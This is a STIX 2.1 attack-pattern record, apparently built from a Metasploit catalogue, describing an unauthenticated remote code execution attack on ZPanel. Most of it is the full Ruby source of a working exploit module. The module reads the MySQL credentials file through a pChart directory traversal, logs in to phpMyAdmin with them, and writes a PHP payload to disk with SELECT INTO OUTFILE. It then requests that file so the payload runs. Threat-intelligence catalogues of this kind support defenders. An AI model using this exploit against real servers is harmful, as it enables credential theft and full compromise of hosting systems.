{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b43ff773-8f7f-4634-958b-7eab66287c51",
    "created": "2024-08-14T17:09:15.155536Z",
    "modified": "2024-08-14T17:09:15.15554Z",
    "name": "Zpanel Remote Unauthenticated RCE",
    "description": " This module exploits an information disclosure vulnerability in ZPanel. The vulnerability is due to a vulnerable version of pChart used by ZPanel that allows unauthenticated users to read arbitrary files remotely on the file system. This particular module utilizes this vulnerability to identify the username/password combination of the MySQL instance. With the credentials the attackers can login to PHPMyAdmin and execute SQL commands to drop a malicious payload on the filesystem and call it leading to remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/zpanel_information_disclosure_rce.rb",
            "external_id": "zpanel_information_disclosure_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.0xlabs.com/2014/03/zpanel-10.1.x-remote-root.html"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/y5Pf4Yms"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\nrequire 'uri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Zpanel Remote Unauthenticated RCE',\n      'Description'    => %q{\n        This module exploits an information disclosure vulnerability\n        in ZPanel. The vulnerability is due to a vulnerable version\n        of pChart used by ZPanel that allows unauthenticated users to read\n        arbitrary files remotely on the file system. This particular module\n        utilizes this vulnerability to identify the username/password\n        combination of the MySQL instance. With the\n        credentials the attackers can login to PHPMyAdmin and execute\n        SQL commands to drop a malicious payload on the filesystem and\n        call it leading to remote code execution.\n      },\n      'Author' =>\n        [\n          'Balazs Makany',      # pChart vuln discovery\n          'Jose Antonio Perez', # Found vulnerable version of pChart on ZPanel\n          'dawn isabel',\n          'brad wolfe',\n          'brent morris',\n          'james fitts'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'EDB', '31173' ],    # vulnerable version of pChart used by zpanel\n          [ 'OSVDB', '102595' ], # vulnerable version of pChart used by zpanel\n          [ 'URL', 'http://blog.0xlabs.com/2014/03/zpanel-10.1.x-remote-root.html' ],\n          [ 'URL', 'http://pastebin.com/y5Pf4Yms' ]\n        ],\n      'Payload' =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],\n          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-01-30'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to Zpanel', '/zpanel'])\n      ])\n  end\n\n  def get_setting(res, setting_name)\n    n = ::Nokogiri::HTML(res.body)\n    spans = n.search('//code//span//span')\n    found_element = spans.select{ |e| /#{setting_name}/ === e.text }.first\n    val = found_element.next.next.text\n    val.scan(/['\"]([[:print:]]+)['\"]/).flatten.first || ''\n  end\n\n  def get_user(res)\n    get_setting(res, 'user')\n  end\n\n  def get_passwd(res)\n    get_setting(res, 'pass')\n  end\n\n  def get_dbname(res)\n    get_setting(res, 'dbname')\n  end\n\n  def dot_dot_slash(uri)\n    res = send_request_cgi({\n      'method' =>'GET',\n      'uri' => normalize_uri(\"#{uri}\", 'etc', 'lib', 'pChart2', 'examples', 'index.php'),\n      'vars_get' => {\n        'Action' => 'View',\n        'Script' => '../../../../cnf/db.php'\n      }\n    })\n\n    uname  = get_user(res)\n    passwd = get_passwd(res)\n    dbname = get_dbname(res)\n\n    return uname, passwd, dbname\n  end\n\n  def get_token_from_form(res)\n    hidden_inputs = res.get_hidden_inputs\n    hidden_inputs.first['token']\n  end\n\n  def get_token_from_url(url)\n    u = URI(url)\n    u.query.split('&').each do |param|\n      param_name, param_value = param.scan(/([[:print:]]+)=([[:print:]]+)/).flatten\n      return param_value if param_name == 'token'\n    end\n\n    ''\n  end\n\n  def grab_sess_and_token(uri)\n    print_status('Attempting to get PHPSESSIONID')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(\"#{uri}\"),\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while attempting to get PHPSESSID')\n    end\n\n    cookies = res.get_cookies\n    sid = cookies.scan(/(PHPSESSID=\\w+);*/).flatten[0] || ''\n\n    if sid.length > 0\n      print_good('PHPSESSID identified!')\n      print_good(\"PHPSESSID = #{sid.split(\"=\")[1]}\")\n\n      print_status('Attempting to get CSRF token')\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(\"#{uri}\", 'etc', 'apps', 'phpmyadmin', 'index.php'),\n        'Cookie' => \"#{sid}\"\n      })\n\n      unless res\n        fail_with(Failure::Unknown, 'Connection timed out while attempting to get CSRF token')\n      end\n\n      token = get_token_from_form(res)\n      cookies = res.get_cookies\n\n      cookies = cookies.split('; ')\n      cookies = \"#{cookies[-1]} #{cookies[1]}; #{cookies[2]}; #{cookies[3]}; #{sid}\"\n\n      if token.length > 0\n        print_good('CSRF token identified!')\n        print_good(\"CSRF token = #{token}\")\n        return cookies, token, sid\n      else\n        print_error('CSRF token could not be identified...')\n      end\n    else\n      print_error('PHPSESSID could not be identified...')\n    end\n  end\n\n  def login_phpmyadmin(uri, uname, passwd, cookies, token, sess_id)\n    old_cookies = cookies\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri('etc', 'apps', 'phpmyadmin', 'index.php'),\n      'cookie' => cookies,\n      'ctype'  => 'application/x-www-form-urlencoded',\n      'headers'=>\n        {\n          'Referer' => \"http://#{datastore['RHOST']}/etc/apps/phpmyadmin/\",\n        },\n      'vars_post' => {\n        'pma_username'         => uname,\n        'pma_password'         => passwd,\n        'server'               => '1',\n        'lang'                 => 'en',\n        'collation_connection' => 'utf8_general_ci',\n        'token'                => token\n      }\n    })\n\n    cookies = \"#{res.get_cookies}\"\n\n    old_cookies = old_cookies.split(\"; \")\n    cookies = cookies.split(\"; \")\n\n    new_cookies =  \"#{old_cookies[0]}; \"\n    new_cookies << \"#{old_cookies[1]}; \"\n    new_cookies << \"#{old_cookies[2]}; \"\n    new_cookies << \"#{old_cookies[3]}; \"\n    new_cookies << \"#{cookies[0]}; \"\n    new_cookies << \"#{cookies[1]} \"\n    new_cookies << \"#{sess_id}\"\n\n    token = get_token_from_url(res['Location'])\n\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri('etc', 'apps', 'phpmyadmin', 'index.php'),\n      'Referer'  => \"http://#{datastore['RHOST']}/etc/apps/phpmyadmin/\",\n      'cookie'   => new_cookies,\n      'vars_get' => {\n        'token' => token\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out while attempting to login to phpMyAdmin')\n    end\n\n    if res.code == 200 and res.body.to_s =~ /phpMyAdmin is more friendly with a/\n      print_good('PHPMyAdmin Login Successful')\n      return new_cookies, token\n    end\n  end\n\n  def do_sql(cookies, token, uri)\n    fname = \"#{rand_text_alpha_upper(5)}.php\"\n    sql_stmt = \"SELECT \\\"<?php #{payload.encoded} ?>\\\" INTO OUTFILE \\\"/etc/zpanel/panel/#{fname}\\\"\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri('etc', 'apps', 'phpmyadmin', 'import.php'),\n      'cookie' => cookies,\n      'ctype'  =>'application/x-www-form-urlencoded; charset=UTF-8',\n      'headers' => {\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Referer' => \"http://#{datastore['RHOST']}/etc/apps/phpmyadmin/server_sql.php?token=#{token}\"\n      },\n      'vars_post' => {\n        'is_js_confirmed' => '0',\n        'token'           => token,\n        'pos'             => '0',\n        'goto'            => 'server_sql.php',\n        'message_to_show' => 'Your+SQL+query+has+been+executed+successfully',\n        'prev_sql_query'  => '',\n        'sql_query'       => sql_stmt,\n        'sql_delimiter'   => ';',\n        'show_query'      => '1',\n        'ajax_request'    => 'true',\n        '_nocache'        => rand.to_s[2..19].to_i\n      }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out when attempting to upload payload')\n    end\n\n    if res.body =~ /\"success\":true/\n      print_good(\"'#{fname}' successfully uploaded\")\n      print_good(\"A privilege escalation exploit can be found 'exploits/linux/local/zpanel_zsudo'\")\n      print_status(\"Executing '#{fname}' on the remote host\")\n\n      res = send_request_cgi({\n        'method'=>'GET',\n        'uri'=>normalize_uri(\"#{uri}\", \"#{fname}\")\n      })\n    else\n      print_error(\"#{res.body.to_s}\")\n    end\n  end\n\n  def exploit\n    # Checking pChart\n    res = send_request_cgi({\n      'method'=> 'GET',\n      'uri'=> normalize_uri(\"#{datastore['URI']}\", 'etc', 'lib', 'pChart2', 'examples', 'index.php')\n    })\n\n    # if pChart is vuln version\n    if res.body =~ /pChart 2\\.x/\n      uname, passwd, db_name = dot_dot_slash(\"#{datastore['URI']}\")\n      if uname.length > 0 && passwd.length > 0\n        print_good('Directory traversal successful, Username/Password identified!')\n        print_good(\"Username: #{uname}\")\n        print_good(\"Password: #{passwd}\")\n        print_good(\"DB Name: #{db_name}\")\n        cookies, token, sess_id = grab_sess_and_token(\"#{datastore['URI']}\")\n        print_status('Logging into PHPMyAdmin now')\n        cookies, token = login_phpmyadmin(\"#{datastore['URI']}\", uname, passwd, cookies, token, sess_id)\n        print_status('Uploading malicious payload now')\n        do_sql(cookies, token, \"#{datastore['URI']}\")\n      else\n        print_error('It appears that the directory traversal was unsuccessful...')\n      end\n    else\n      print_error(\"It appears that the version of pChart is not vulnerable...\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-01-30",
    "x_mitre_platforms": [
        "php'"
    ]
}